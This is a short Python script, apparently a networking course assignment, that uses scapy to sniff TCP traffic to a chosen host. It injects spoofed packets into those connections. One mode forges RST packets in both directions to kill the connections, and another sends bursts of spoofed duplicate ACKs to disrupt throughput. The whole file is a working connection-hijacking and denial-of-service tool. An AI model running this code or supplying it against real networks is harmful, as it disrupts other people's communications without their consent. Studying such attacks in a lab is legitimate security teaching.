import sys

import scapy.all as scapy
scapy.conf.use_pcap = True

packets_intercepted = 0

def send_rst_packet(captured_packet):
    source_ip = captured_packet[scapy.IP].src
    destination_ip = captured_packet[scapy.IP].dst
    source_port = captured_packet[scapy.TCP].sport
    destination_port = captured_packet[scapy.TCP].dport
    sequence_number = captured_packet[scapy.TCP].seq
    acknowledgement_number = captured_packet[scapy.TCP].ack

    # Construct the RST packet to source IP and port
    rst_packet_to_source = scapy.IP(src=destination_ip, dst=source_ip) / scapy.TCP(sport=destination_port, dport=source_port, 
    flags="R", seq=acknowledgement_number, ack=sequence_number)

    rst_packet_to_dest = scapy.IP(src=source_ip, dst=destination_ip) / scapy.TCP(sport=source_port, dport=destination_port, 
    seq=sequence_number, ack=acknowledgement_number, flags="R")

    global packets_intercepted
    # Send the RST packets
    scapy.send(rst_packet_to_source, verbose=False)
    scapy.send(rst_packet_to_dest, verbose=False)
    print(f"Intercapted packet {packets_intercepted}")
    packets_intercepted += 1

def send_3ack_packets(captured_packet):
    source_ip = captured_packet[scapy.IP].src
    destination_ip = captured_packet[scapy.IP].dst
    source_port = captured_packet[scapy.TCP].sport
    destination_port = captured_packet[scapy.TCP].dport
    sequence_number = captured_packet[scapy.TCP].seq
    acknowledgement_number = captured_packet[scapy.TCP].ack

    # Construct the RST packet to source IP and port
    ack_packet_to_source = scapy.IP(src=destination_ip, dst=source_ip) / scapy.TCP(sport=destination_port, dport=source_port, 
    flags="A", seq=sequence_number, ack=acknowledgement_number+1)

    global packets_intercepted
    # Send the RST packets
    for i in range(3):
        scapy.send(ack_packet_to_source, verbose=True)

    #print(f"Sent 3 ACK packets, run nr. {packets_intercepted}")
    packets_intercepted += 1

if __name__ == "__main__":

    argc = len(sys.argv)

    if argc != 5:

        print("Usage: python3 task2.py <source_addr> <dest_addr> <dest_port> <attack>", file=sys.stderr)

        sys.exit(1)

    source_addr = sys.argv[1]
    dest_addr = sys.argv[2]
    dest_port = int(sys.argv[3])
    attack = sys.argv[4]

    if attack.lower() == "rst":
        print(f"Waiting for TCP connection between {source_addr} and {dest_addr}:{dest_port} to send RST packet")
        capture = scapy.sniff(filter="tcp and host " + dest_addr, count=500, prn=send_rst_packet)
        print("Completed")

    elif attack.lower() == "3ack":
        print(f"Waiting for TCP connection between {source_addr} and {dest_addr}:{dest_port} to send 3ACK packets")
        capture = scapy.sniff(filter="tcp and host " + dest_addr, count=100000, prn=send_3ack_packets)
        print("Completed")